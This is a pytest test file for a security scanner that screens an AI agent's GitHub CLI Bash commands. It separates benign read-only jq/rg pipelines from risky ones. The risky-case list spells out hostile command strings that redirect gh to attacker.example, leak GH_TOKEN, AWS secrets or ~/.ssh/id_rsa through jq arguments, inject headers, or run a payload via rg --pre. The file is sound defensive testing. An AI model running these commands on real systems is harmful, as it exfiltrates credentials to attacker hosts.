"""Regression coverage for read-only GitHub output-filter pipelines."""

from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime.secret_file_requests import (
    extract_sensitive_tool_action_request,
    is_explicitly_benign_tool_action_request,
)


@pytest.mark.parametrize(
    "command",
    (
        "gh run view 123 --repo example/project --log-failed | rg --no-config -n 'FAILURES|FAILED' | tail -120",
        (
            "gh api graphql -f 'query=query { viewer { login name } }' | "
            "jq '[.data.viewer | {login, name}] | map(select(.login != null))'"
        ),
        "gh api user | jq '[.env, .import, .include, {env: .value}, \"env\"]'",
        (
            "gh api -H 'Accept: application/vnd.github.raw+json' "
            "'repos/hashgraph-online/hol-guard/contents/ci/test-suite-ratchet-baseline.json?ref=release/3.0' "
            "| jq '{tests: .tests, total: .total}'"
        ),
    ),
)
def test_proven_github_reads_with_safe_output_filters_are_prompt_free(tmp_path: Path, command: str) -> None:
    match = extract_sensitive_tool_action_request("Bash", {"command": command}, cwd=tmp_path)

    assert match is None


def test_static_github_content_read_with_safe_jq_filter_is_explicitly_benign(tmp_path: Path) -> None:
    command = (
        "gh api -H 'Accept: application/vnd.github.raw+json' "
        "'repos/hashgraph-online/hol-guard/contents/ci/test-suite-ratchet-baseline.json?ref=release/3.0' "
        "| jq '{tests: .tests, total: .total}'"
    )

    assert is_explicitly_benign_tool_action_request(
        "Bash",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
    for github_command in (
        "gh api --hostname github.com repos/o/r",
        "GH_HOST=github.com gh api repos/o/r",
        "gh_host=attacker.example gh api repos/o/r",
        "env GH_HOST=github.com gh api repos/o/r",
        "gh api -H 'Accept: application/vnd.github+json' repos/o/r",
        "gh api -H 'X-GitHub-Api-Version: 2022-11-28' repos/o/r",
    ):
        assert is_explicitly_benign_tool_action_request(
            "Bash",
            {"command": github_command},
            cwd=tmp_path,
            home_dir=tmp_path,
        )


@pytest.mark.parametrize(
    "command",
    (
        "gh run view 123 --repo example/project --log-failed | rg --pre ./payload FAILURES",
        "gh run view 123 --repo example/project --log-failed | rg -n FAILURES",
        "gh run view 123 --repo example/project --log-failed | rg 'FAILURES>result.log'",
        "gh run view 123 --repo example/project --log-failed | rg FAILURES workspace.log",
        "gh api graphql -f 'query=query { viewer { login } }' | jq --slurpfile secrets private.json '.'",
        "gh api user | jq 'env | to_entries'",
        "gh api user | jq '{env}'",
        "gh api user | jq '$ENV | .GH_TOKEN'",
        "gh api user | jq 'include \"helpers\"; transform'",
        "gh api graphql -f 'query=query { viewer { login } }' | jq '.data.viewer | {login}''",
        "gh api graphql -f 'query=query { viewer { login } }' | jq '.' > result.json",
        "gh pr view 123 --repo example/project; gh pr edit 123 --repo example/project --title changed",
        "gh api --hostname attacker.example repos/o/r",
        "gh api -h attacker.example repos/o/r",
        "GH_HOST=attacker.example gh api repos/o/r",
        "GH_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_TOKEN=literal-secret gh api repos/o/r",
        "GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "env GH_TOKEN=literal-secret gh api repos/o/r",
        "env GH_HOST=attacker.example gh api repos/o/r",
        "env GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "export GH_HOST=attacker.example; gh api repos/o/r | jq .",
        "export GH_TOKEN=literal; gh api repos/o/r | jq .",
        "GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .",
        "export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .",
        "gh api --hostname github.com --hostname attacker.example repos/o/r",
        "gh api -h github.com -h attacker.example repos/o/r",
        "export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r",
        "export -x GH_TOKEN=literal; gh api repos/o/r",
        "readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r",
        "declare -x GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=attacker.example bash -lc 'gh api repos/o/r'",
        "bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'",
        "export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r",
        "export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r",
        "f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .",
        "gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$GH_TOKEN\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" '{x:$x}'",
        "gh api -H 'Authorization: Bearer literal-secret' repos/o/r",
        "gh api -H 'X-Callback: https://evil.example/upload' repos/o/r",
        "gh api -H $'Accept: application/vnd.github.raw+json\\r\\nX-Evil: yes' repos/o/r",
    ),
)
def test_github_output_filters_do_not_mask_reads_or_mutations(tmp_path: Path, command: str) -> None:
    match = extract_sensitive_tool_action_request("Bash", {"command": command}, cwd=tmp_path)

    assert match is not None
    assert not is_explicitly_benign_tool_action_request(
        "Bash",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
